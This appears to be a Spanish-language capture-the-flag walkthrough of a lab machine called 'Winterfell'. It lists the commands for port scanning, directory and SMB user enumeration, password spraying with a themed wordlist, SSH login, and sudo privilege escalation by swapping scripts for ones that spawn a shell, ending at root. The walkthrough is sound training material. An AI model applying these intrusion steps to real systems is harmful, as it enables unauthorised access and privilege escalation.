@@ -1,0 +1,136 @@
+Maquina: Winterfell
+
+Autor: Zunderrub
+
+Dificultad: Facil
+
+ping 172.17.0.2 -c 1 
+
+sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv 
+
+Vamos a la web, observamos la página de inicio que indica diario de Jon y los botones del navbar son no funcionales
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.17.0.2
+
+Realizamos un escaneo de directorios y podemos ver que encontramos uno que se llama /dragon
+
+Agregamos el directorio a la dirección web y vemos un archivo llamado EpisodioT1, el cual contiene los títulos de la primera temporada de juego de tronos
+
+smbclient -L 172.17.0.2
+
+Listamos el puerto abierto de smb y vemos que no tenemos acceso
+
+Necesitamos algún nombre usuario, buscaremos usuarios válidos para smb. Usamos enum4linux
+
+enum4linux 172.17.0.2
+
+encontramos user Jon
+
+ahora debemos extraer el password para este usuario. Para ello, ya que la máquina trata de GOT suponemos que el password podría ser alguno de los títulos que encontramos, creamos una lista
+
+nano passwords.txt
+
+seacercaelinvierno 
+elcaminoreal 
+lordnieve
+tullidosbastardosycosasrotas 
+elloboyelleon 
+unacoronadeoro 
+ganasomueres 
+porelladodelapunta 
+baelor 
+fuegoyhielo
+
+
+Usamos Crackmapexec y encontramos el password para jon:seacercaelinvierno
+
+smbclient \\\\172.17.0.2\\shared -U jon
+
+Nos conectamos a SMB usando las credenciales y podemos observar que tenemos acceso a un directorio llamado proteccion_del_reino
+
+get proteccion_del_reino
+
+Extraemos el archivo proteccion_del_reino en nuestra máquina local
+
+cat proteccion_del_reino
+
+Podemos observar que el texto contiene un password, que a primera vista podemos ver que se trata de base 64
+
+echo "aGlqb2RlbGFuaXN0ZXI0" | base64 -d
+
+Decodificamos el mensaje y podemos observar que el password es hijodelanister
+
+ssh jon@172.17.0.2
+
+Nos conectamos por SSH con las credenciales y podemos observar que ya tenemos acceso como jon
+
+ls
+
+cat paraJon
+
+sudo -l
+
+Una vez dentro hacemos un ls y encontramos un archivo que contiene un mensaje sobre una herramienta, si hacemos un sudo -l podemos observar que podemos elevar privilegios como aria usando python3 y un archivo en Python que está oculto
+
+ls -la
+
+Listamos los archivos ocultos y si podemos observar el archivo.mensaje.py, al abrir el mensaje podemos ver que es un script que no nos ayudara mucho
+
+rm .mensaje.py
+
+rm -rf .mensaje.py
+
+nano mensaje.py
+
+import os;
+os.system("/bin/bash")
+
+sudo -u aria /usr/bin/python3 /home/jon/ .mensaje.py
+
+Observamos los permisos y vemos que no podemos editarlo, ya que no contamos con los permisos, lo que podemos hacer es eliminar el archivo y crear uno nuevo con el mismo nombre el cual contenga un comando para que nos genere una nueva shell. De esta manera podemos escalar privilegios como aria
+
+sudo -l
+
+Como aria realizamos un sudo -l y observamos que podemos escalar como daenerys
+
+sudo -u daenerys ls /home/daenerys/
+
+Lo que los binarios nos permiten es poder leer y listar archivos de propiedad de daenerys. Así que no estaría mal suponer que debemos leer algún archivo dentro del directorio home de ella. Primero listamos el directorio y podemos observar que tenemos un archivo llamado mensajeParajon
+
+sudo -u daenerys cat /home/daenerys/mensajeParaJon
+
+Leyendo el mensaje podemos observar que nos indica el password, y si suponemos bien el password debería ser drakaris
+
+su daenerys
+
+drakaris
+
+Ingresamos las credenciales para este usuario y podemos comprobar que si es correcto y ya somos daenerys
+
+sudo -l
+
+Una vez como este usuario buscamos como elevar privilegios y volvemos a realizar un sudo -l y podemos observar que podemos emplear bash y un archivo oculto
+
+cat /home/daenerys/.secret/.shell.sh
+
+cd /home/daenerys/.secret/
+
+ls
+
+ls -la
+
+Primero leemos el archivo y podemos ver que es una bash que establece conexión con otra dirección IP, pero si observamos los permisos esto lo tenemos nosotros, así que para elevar privilegios solo debemos editarlo
+
+nano shell.sh
+
+cat .shell.sh
+
+#!/bin/bash
+
+bash
+
+sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
+
+whoami
+
+Para obtener el root solo modificamos el archivo de la siguiente manera y luego ejecutamos el archivo. De esta manera obtendríamos la shell con permisos de root. Culminando de manera exitosa la máquina
